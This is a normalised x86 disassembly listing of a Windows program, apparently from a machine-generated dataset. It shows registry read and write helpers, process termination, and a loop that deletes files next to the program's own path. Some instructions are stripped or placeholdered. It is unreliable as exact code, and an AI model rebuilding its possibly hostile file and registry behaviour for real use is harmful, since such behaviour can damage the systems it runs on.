call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::size@IAT ]
lea eax [ eax + eax + 0x2 ]
mov ecx edi
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a788
add esp 0x20
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
mov al [ rw-data ]
push eax
call sub_406cd5
add esp 0x18
push 0x1
pop eax
jmp r-xdata
push 0xbb8
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_409cc8
and [ rw-data ] 0x0
push ebx
push 0x0
push [ rw-data ]
call [ TerminateProcess@IAT ]
push 0xffffffff
push [ rw-data ]
test eax eax
setne bl
call [ WaitForSingleObject@IAT ]
mov al bl
pop ebx
retn
sub_409d22
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov esi esp
push eax
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
push 0x68
call sub_402062
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
push sub_409dab
mov ecx ebx
call sub_4020e9
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_409dab
push ebp
mov ebp esp
sub esp 0x20
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp + 0xc ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
add esp 0x24
cmp esi 0x44
jne r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
pop esi
leave
retn
push 0x4
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_409ea6
add esp 0x50
mov ecx rw-data
call sub_402094
sub_409ea6
push ebp
mov ebp esp
sub esp 0x2bc
push ebx
push esi
push edi
lea eax [ ebp - 0x2bc ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
and [ ebp - 0x2 ] 0x0
and [ ebp - 0x3 ] 0x0
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x74 ]
push eax
xor bl bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x54 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x64 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_4107e9
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x94 ]
push 0x30
push eax
call sub_407ca7
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_4107e9
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xa4 ]
push 0x30
push eax
call sub_407ca7
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_4107e9
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x84 ]
push 0x30
push eax
call sub_407ca7
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov edi r--data
lea eax [ ebp - 0x94 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
mov esi r--data
push eax
push esi
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x2bc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40e778
pop ecx
pop ecx
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xa4 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x2bc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40e778
pop ecx
pop ecx
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x84 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x2bc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40e778
pop ecx
pop ecx
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov esi [ DeleteFileW@IAT ]
xor edi edi
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0xa4 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x2 ] 0x1
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call esi
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x84 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x3 ] 0x1
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call esi
cmp [ ebp - 0x2 ] 0x0
je r-xdata
lea ecx [ ebp - 0x84 ]
mov bl 0x1
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call esi
push 0x1f4
call [ Sleep@IAT ]
inc edi
cmp edi 0xa
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
lea eax [ ebp - 0x74 ]
lea ecx [ ebp - 0x94 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
test bl bl
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x64 ]
mov esi esp
lea ecx [ ebp - 0x54 ]
push eax
mov eax rw-data
push eax
push ecx
lea ecx [ ebp - 0x74 ]
push eax
push ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x6a
call sub_402062
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
sub esp 0x10
lea eax [ ebp - 0x64 ]
mov esi esp
lea ecx [ ebp - 0x54 ]
push eax
mov eax rw-data
push eax
push ecx
lea ecx [ ebp - 0x74 ]
push eax
push ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x69
call sub_402062
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_40a39b
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
xor esi esi
push 0x20019
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
push edi
push esi
push esi
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov edi eax
call [ RegCloseKey@IAT ]
cmp edi esi
pop edi
sete al
jmp r-xdata
pop esi
pop ebp
retn
sub_40a3e4
push ebp
mov ebp esp
push ecx
push ecx
push 0x4
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x20019
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
leave
retn
lea eax [ ebp - 0x4 ]
push esi
push eax
lea eax [ ebp - 0x8 ]
push [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
leave
retn
sub_40a43e
push ebp
mov ebp esp
sub esp 0x404
push ebx
xor ebx ebx
cmp [ ebp + 0x18 ] bl
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x400
push eax
jne r-xdata
push 0x20119
push 0x20019
jmp r-xdata
lea eax [ ebp + 0x1b ]
push eax
push r--data
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0x10 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp + 0x1b ]
push eax
lea eax [ ebp - 0x404 ]
push eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop ebx
leave
retn
sub_40a4be
push ebp
mov ebp esp
sub esp 0x804
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x400
push eax
push 0x20019
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x13 ]
push eax
push r--data
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x804 ]
push eax
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call [ RegQueryValueExW@IAT ]
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
lea eax [ ebp + 0x13 ]
push eax
lea eax [ ebp - 0x804 ]
push eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40a531
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
xor edi edi
push eax
lea eax [ ebp - 0x8 ]
push edi
mov esi [ RegQueryValueExW@IAT ]
push eax
push edi
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
call esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0x13 ]
push eax
push ebx
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] edi
jbe r-xdata
push [ ebp - 0x4 ]
call [ malloc@IAT ]
pop ecx
mov ebx eax
mov ecx [ ebp - 0x4 ]
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
sub_40a5ae
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0xc ]
push eax
push 0x20019
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
leave
retn
lea eax [ ebp + 0x18 ]
push edi
push eax
push [ ebp + 0x14 ]
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov edi eax
call [ RegCloseKey@IAT ]
test edi edi
pop edi
jne r-xdata
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x400 ]
push [ ebp + 0x1c ]
call sub_402a90
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x400 ]
push [ ebp + 0x14 ]
call sub_402b05
mov al 0x1
leave
retn
sub_40a624
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
pop ebp
retn
push ebx
push esi
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
xor ebx ebx
push [ ebp + 0x24 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop esi
pop ebx
pop ebp
retn
mov bl 0x1
sub_40a690
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp + 0x14 ]
